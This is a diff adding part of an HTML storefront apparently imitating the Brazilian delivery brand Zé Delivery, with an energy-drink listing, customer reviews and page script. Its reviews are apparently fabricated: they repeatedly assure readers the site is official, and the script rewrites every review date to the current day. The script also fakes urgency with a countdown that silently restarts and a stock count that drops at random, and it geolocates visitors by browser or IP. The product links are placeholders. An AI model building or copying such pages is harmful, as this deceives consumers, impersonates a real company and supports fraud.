+          <span class="btn-add-card">Pedir <i class="fas fa-chevron-right"></i></span>
+        </a>
+      </div>
+    </section>
+
+    <!-- ENERGÉTICOS -->
+    <section class="section" id="sec-energetico">
+      <div class="section-head">
+        <h2> Energéticos</h2>
+        <p>Turbine qualquer combo com energia</p>
+      </div>
+      <div class="product-list">
+        <a class="product-card" href="#LINK-energetico" target="_blank" rel="noopener" data-produto="energetico" data-nome="Pack Energético 6 unidades" onclick="pedirZe(event,this)">
+          <div class="prod-info">
+            <div class="prod-badges"><span class="badge new">Novo</span></div>
+            <div class="prod-name">Pack Energético 6 unidades</div>
+            <div class="prod-desc">6 latas energético 250ml — sabor original</div>
+            <div class="prod-prices">
+              <span class="prod-price">R$ 38,90</span>
+            </div>
+          </div>
+          <div class="prod-img-wrap"><img src="images/bull.png" alt="Pack Energético"></div>
+          <span class="btn-add-card">Pedir <i class="fas fa-chevron-right"></i></span>
+        </a>
+      </div>
+    </section>
+
+    <!-- AVALIAÇÕES -->
+    <section class="section reviews-section" id="sec-avaliacoes">
+      <div class="reviews-header">
+        <div class="reviews-score">
+          <div class="score-num">4,9</div>
+          <div class="score-stars">★★★★★</div>
+        </div>
+        <div class="reviews-meta">
+          <p>71.368 avaliações</p>
+          <small>8.546 avaliações nos últimos 30 dias</small>
+        </div>
+      </div>
+
+      <div class="review-item">
+        <div class="review-avatar">T</div>
+        <div class="review-body">
+          <span class="review-name">Thales</span>
+          <span class="review-stars">★★★★★</span>
+          <span class="review-date" id="rDate1">  •  05/07/2026</span>
+          <p class="review-text">O site é de fato o oficial da empresa. Não demorou muito para chegar, veio muito bem embalado. Produtos originais, com lacres originais. Pode comprar! 👍</p>
+        </div>
+        <img class="review-img" src="images/PHOTO-2025-04-15-01-57-52.jpg" alt="" onerror="this.style.display='none'" style="display: none;">
+      </div>
+
+      <div class="review-item">
+        <div class="review-avatar">F</div>
+        <div class="review-body">
+          <span class="review-name">Fernando</span>
+          <span class="review-stars">★★★★★</span>
+          <span class="review-date" id="rDate2">  •  05/07/2026</span>
+          <p class="review-text">Sempre muito bem embalado e a entrega muito rápida. Produto original, podem comprar! Zé Delivery é confiança e qualidade!</p>
+        </div>
+        <img class="review-img" src="images/PHOTO-2025-04-15-01-58-38.jpg" alt="" onerror="this.style.display='none'" style="display: none;">
+      </div>
+
+      <div class="review-item">
+        <div class="review-avatar">K</div>
+        <div class="review-body">
+          <span class="review-name">Karol</span>
+          <span class="review-stars">★★★★★</span>
+          <span class="review-date" id="rDate3">  •  05/07/2026</span>
+          <p class="review-text">Sou viciada em comprar pelo app e agora pelo site pq aqui tem muito mais promoção boa! Sempre produtos originais, com selo e lacrados 😍</p>
+        </div>
+        <img class="review-img" src="images/PHOTO-2025-04-15-02-03-00.jpg" alt="" onerror="this.style.display='none'" style="display: none;">
+      </div>
+
+      <div class="review-item">
+        <div class="review-avatar">M</div>
+        <div class="review-body">
+          <span class="review-name">Marcos</span>
+          <span class="review-stars">★★★★★</span>
+          <span class="review-date" id="rDate4">  •  05/07/2026</span>
+          <p class="review-text">Tenho o app mas sempre fico atento aqui no site pq tem mais promoção boa! Esse é meu segredo 🤫 Maravilhoso e original, entrega rápida do Zé Delivery 🔥</p>
+        </div>
+        <img class="review-img" src="images/PHOTO-2025-04-15-02-04-34.jpg" alt="" onerror="this.style.display='none'" style="display: none;">
+      </div>
+
+      <div class="review-item">
+        <div class="review-avatar">G</div>
+        <div class="review-body">
+          <span class="review-name">Gustavo</span>
+          <span class="review-stars">★★★★★</span>
+          <span class="review-date" id="rDate5">  •  05/07/2026</span>
+          <p class="review-text">Já comprei outras vezes pelo app. Caixa super bem embalada! O entregador super cuidadoso. Sem dano nenhum! Pra quem tem dúvida: o site é realmente oficial! 🙏</p>
+        </div>
+        <img class="review-img" src="images/PHOTO-2025-04-15-02-01-36.jpg" alt="" onerror="this.style.display='none'" style="display: none;">
+      </div>
+    </section>
+
+    <footer class="footer-info">
+      <strong>Zé Delivery</strong><br>
+      © <span id="anoFooter">2026</span> — Todos os direitos reservados.<br>
+      Venda e entrega exclusiva para maiores de 18 anos.<br>
+      Beba com moderação.
+    </footer>
+  </main>
+
+</div><!-- /page -->
+
+<!-- ══════════════════════════════════════════════════════════════ -->
+<script>
+  /* ── Localização ─────────────────────────────────────────── */
+  async function getCityFromCoords(lat, lon) {
+    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&accept-language=pt-BR`);
+    const d = await r.json();
+    const city = d.address.city || d.address.town || d.address.village || d.address.suburb || '';
+    const state = d.address.state_code || d.address.state || '';
+    return { city, state };
+  }
+
+  async function getCityFromIP() {
+    const apis = [
+      async () => {
+        const r = await fetch('https://ipwho.is/');
+        const d = await r.json();
+        if (!d.success || !d.city) throw new Error();
+        return { city: d.city, state: d.region_code || '' };
+      },
+      async () => {
+        const r = await fetch('https://freeipapi.com/api/json');
+        const d = await r.json();
+        if (!d.cityName || d.cityName === '-') throw new Error();
+        return { city: d.cityName, state: d.regionCode || '' };
+      }
+    ];
+    for (const api of apis) {
+      try { return await api(); } catch {}
+    }
+    throw new Error('IP APIs falharam');
+  }
+
+  function setLocationUI(city, state) {
+    const label = city + (state ? `, ${state}` : '');
+    document.getElementById('locCityName').textContent = label;
+    document.getElementById('locCity').textContent = city;
+  }
+
+  async function detectLocation() {
+    // Tenta geolocalização real do browser primeiro
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          try {
+            const { city, state } = await getCityFromCoords(pos.coords.latitude, pos.coords.longitude);
+            if (city) { setLocationUI(city, state); return; }
+          } catch {}
+          // Se Nominatim falhar, cai no IP
+          try { const { city, state } = await getCityFromIP(); setLocationUI(city, state); } catch {}
+        },
+        async () => {
+          // Usuário negou permissão — usa IP
+          try { const { city, state } = await getCityFromIP(); setLocationUI(city, state); } catch {
+            document.getElementById('locCityName').textContent = 'Sua Cidade';
+          }
+        },
+        { timeout: 6000 }
+      );
+    } else {
+      // Browser sem suporte — usa IP
+      try { const { city, state } = await getCityFromIP(); setLocationUI(city, state); } catch {
+        document.getElementById('locCityName').textContent = 'Sua Cidade';
+      }
+    }
+  }
+  detectLocation();
+
+  /* ── Confirmação de pedido (Zé) ──────────────────────────── */
+  function pedirZe(event, el) {
+    const nome = el.dataset.nome || 'seu produto';
+    const overlay = document.getElementById('zeConfirmOverlay');
+    document.getElementById('zeConfirmProduto').textContent = nome;
+    overlay.classList.add('show');
+    document.body.style.overflow = 'hidden';
+    clearTimeout(window._zeConfirmTimer);
+    window._zeConfirmTimer = setTimeout(() => {
+      overlay.classList.remove('show');
+      document.body.style.overflow = '';
+    }, 2600);
+  }
+
+  function confirmLocation() {
+    document.getElementById('locOverlay').style.display = 'none';
+  }
+
+  /* ── Countdown promo ─────────────────────────────────────── */
+  let cdEnd = Date.now() + (22 * 60 + 37) * 1000;
+  function updateCd() {
+    const left = Math.max(0, cdEnd - Date.now());
+    const m = Math.floor(left / 60000);
+    const s = Math.floor((left % 60000) / 1000);
+    document.getElementById('cdMin').textContent = String(m).padStart(2,'0');
+    document.getElementById('cdSec').textContent = String(s).padStart(2,'0');
+    if (left === 0) cdEnd = Date.now() + 25 * 60 * 1000;
+  }
+  updateCd();
+  setInterval(updateCd, 1000);
+
+  let jackStock = 8;
+  setInterval(() => {
+    if (jackStock > 2 && Math.random() < .15) {
+      jackStock--;
+      const el = document.getElementById('estoqueJack');
+      if (el) el.textContent = jackStock;
+    }
+  }, 8000);
+
+  /* ── Datas avaliações ────────────────────────────────────── */
+  function today() {
+    const d = new Date();
+    return `${String(d.getDate()).padStart(2,'0')}/${String(d.getMonth()+1).padStart(2,'0')}/${d.getFullYear()}`;
+  }
+  ['rDate1','rDate2','rDate3','rDate4','rDate5'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.textContent = '  •  ' + today();
+  });
+  document.getElementById('anoFooter').textContent = new Date().getFullYear();
+
+  /* ── Categorias nav ──────────────────────────────────────── */
+  const catBtns = document.querySelectorAll('.cat-btn');
+  catBtns.forEach(btn => {
+    btn.addEventListener('click', () => {
+      catBtns.forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      const target = document.getElementById(btn.dataset.target);
+      if (target) {
+        const top = target.getBoundingClientRect().top + window.scrollY - 52;
+        window.scrollTo({ top, behavior: 'smooth' });
+      }
+    });
+  });
+  const sections = Array.from(document.querySelectorAll('section[id]'));
+  window.addEventListener('scroll', () => {
+    const y = window.scrollY + 80;
+    sections.forEach(sec => {
+      if (sec.offsetTop <= y && sec.offsetTop + sec.offsetHeight > y) {
+        catBtns.forEach(b => b.classList.remove('active'));
+        const active = document.querySelector(`.cat-btn[data-target="${sec.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { passive: true });
+
+</script>
+
+
+
+</body></html>
